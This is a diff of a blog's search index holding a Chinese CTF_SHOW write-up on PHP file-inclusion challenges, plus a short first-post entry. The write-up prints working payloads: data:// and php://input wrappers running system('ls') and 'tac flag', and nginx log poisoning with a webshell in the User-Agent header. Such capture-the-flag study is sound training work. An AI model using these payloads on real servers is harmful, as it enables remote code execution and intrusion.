@@ -1,94 +1,57 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search>
-  <entry>
-    <title>开始</title>
-    <url>/2022/02/26/article-title/</url>
-    <content><![CDATA[<p>经历了两天的搭建，不断的摸索和百度谷歌搜索，自己的博客也总算是搭建成功了，虽然还很菜，但也总算是跨出了第一步。</p>
-]]></content>
+<search> 
+  
+  
+    
+    <entry>
+      <title>CTF_SHOW之web入门部分wp</title>
+      <link href="/2022/02/26/jian-web1/"/>
+      <url>/2022/02/26/jian-web1/</url>
+      
+        <content type="html"><![CDATA[<h4 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看目录</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'glob:///*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>发现 include 包含函数，选择使用 data 伪协议 data://text/plain,构造 payload：?file=data://text/plain,<?php phpinfo();?>成功出现 phpinfo()页面</p><p><img src="/images/web_78a.png"></p><p>然后输如查询目录的指令，发现有 flag.php 文件：?file=data://text/plain,<?php system("ls");?></p><p><img src="/images/web_78b.png">]</p><p>使用 tac 命令读取文件，成功读取 flag:ctfshow{7bc171e1-06c8-4e6c-8e13-33585ea3d0be}</p><h4 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?phpif(isset($_GET[&#39;file&#39;]))&#123;    $file &#x3D; $_GET[&#39;file&#39;];    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现这次对 php 进行了过滤，但可以使用 php 短标记<?=?>和?占位符进行读出</p><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?&#x3D;system(&quot;tac flag.???&quot;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功读出 flag：ctfshow{e8c8a34c-8e08-4b8e-92ac-6387a53ddb92}</p><h4 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?phpif(isset($_GET[&#39;file&#39;]))&#123;    $file &#x3D; $_GET[&#39;file&#39;];    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这次发现还对 data 进行了替换，原本想想使用的是：</p><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;Php:&#x2F;&#x2F;inputpost: &lt;?php system(&quot;ls&quot;)?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但不知为什么没有显示出来，所以查看了 hint，给的提示是访问 nginx 和 apache 下的日志文件，getshell 的方法，payload 如下：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;489ea2b8-3fb5-4cc6-b9d6-7fc5608c320b.challenge.ctf.show&#x2F;?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 bp 抓包，将🐎写再UA头里</p><p><img src="/images/web_80a.png"></p><p><img src="/images/web_80b.png"></p><p><img src="/images/web_80c.png"></p><h4 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?phpif(isset($_GET[&#39;file&#39;]))&#123;    $file &#x3D; $_GET[&#39;file&#39;];    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现这次还将冒号给过滤了，不过却可以继续访问 var/log/nginx/access.log 日志文件进行传🐎,得到flag</p><p><img src="/images/web_81.png"></p><h4 id="web82-86"><a href="#web82-86" class="headerlink" title="web82-86"></a>web82-86</h4><p>条件竞争，限制了并发，先做后面的。</p>]]></content>
+      
+      
       <categories>
-        <category>搭建</category>
+          
+          <category> ctf_show </category>
+          
       </categories>
-      <tags>
-        <tag>运行中</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTF_SHOW之web入门部分wp</title>
-    <url>/2022/02/26/jian-web1/</url>
-    <content><![CDATA[<h4 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>查看目录</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'glob:///*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>发现 include 包含函数，选择使用 data 伪协议 data://text/plain,构造 payload：?file=data://text/plain,<?php phpinfo();?>成功出现 phpinfo()页面</p>
-<p><img src="D:\study\program\blog\source\images\web_78a.png"></p>
-<p>然后输如查询目录的指令，发现有 flag.php 文件：?file=data://text/plain,<?php system("ls");?></p>
-<p><img src="D:\study\program\blog\source\images\web_78b.png"></p>
-<p>使用 tac 命令读取文件，成功读取 flag:ctfshow{7bc171e1-06c8-4e6c-8e13-33585ea3d0be}</p>
-<h4 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?php
-if(isset($_GET[&#39;file&#39;]))&#123;
-    $file &#x3D; $_GET[&#39;file&#39;];
-    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);
-    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);
-    include($file);
-&#125;else&#123;
-    highlight_file(__FILE__);
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>发现这次对 php 进行了过滤，但可以使用 php 短标记<?=?>和?占位符进行读出</p>
-<pre class="line-numbers language-none"><code class="language-none">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?&#x3D;system(&quot;tac flag.???&quot;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>成功读出 flag：ctfshow{e8c8a34c-8e08-4b8e-92ac-6387a53ddb92}</p>
-<h4 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?php
-if(isset($_GET[&#39;file&#39;]))&#123;
-    $file &#x3D; $_GET[&#39;file&#39;];
-    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);
-    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);
-    include($file);
-&#125;else&#123;
-    highlight_file(__FILE__);
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>这次发现还对 data 进行了替换，原本想想使用的是：</p>
-<pre class="line-numbers language-none"><code class="language-none">?file&#x3D;Php:&#x2F;&#x2F;input
-post: &lt;?php system(&quot;ls&quot;)?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>但不知为什么没有显示出来，所以查看了 hint，给的提示是访问 nginx 和 apache 下的日志文件，getshell 的方法，payload 如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;489ea2b8-3fb5-4cc6-b9d6-7fc5608c320b.challenge.ctf.show&#x2F;?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>使用 bp 抓包，将🐎写再UA头里</p>
-<p><img src="D:\study\program\blog\source\images\web_80a.png"></p>
-<p><img src="D:\study\program\blog\source\images\web_80b.png"></p>
-<p><img src="D:\study\program\blog\source\images\web_80c.png"></p>
-<h4 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?php
-if(isset($_GET[&#39;file&#39;]))&#123;
-    $file &#x3D; $_GET[&#39;file&#39;];
-    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);
-    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);
-    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);
-    include($file);
-&#125;else&#123;
-    highlight_file(__FILE__);
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>发现这次还将冒号给过滤了，不过却可以继续访问 var/log/nginx/access.log 日志文件进行传🐎,得到flag</p>
-<p><img src="D:\study\program\blog\source\images\web_81.png"></p>
-<h4 id="web82-86"><a href="#web82-86" class="headerlink" title="web82-86"></a>web82-86</h4><p>条件竞争，限制了并发，先做后面的。</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 文件包含 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>开始</title>
+      <link href="/2022/02/26/article-title/"/>
+      <url>/2022/02/26/article-title/</url>
+      
+        <content type="html"><![CDATA[<p>经历了两天的搭建，不断的摸索和百度谷歌搜索，自己的博客也总算是搭建成功了，虽然还很菜，但也总算是跨出了第一步。</p>]]></content>
+      
+      
       <categories>
-        <category>ctf_show</category>
+          
+          <category> 搭建 </category>
+          
       </categories>
-      <tags>
-        <tag>文件包含</tag>
-      </tags>
-  </entry>
+      
+      
+        <tags>
+            
+            <tag> 运行中 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
 </search>
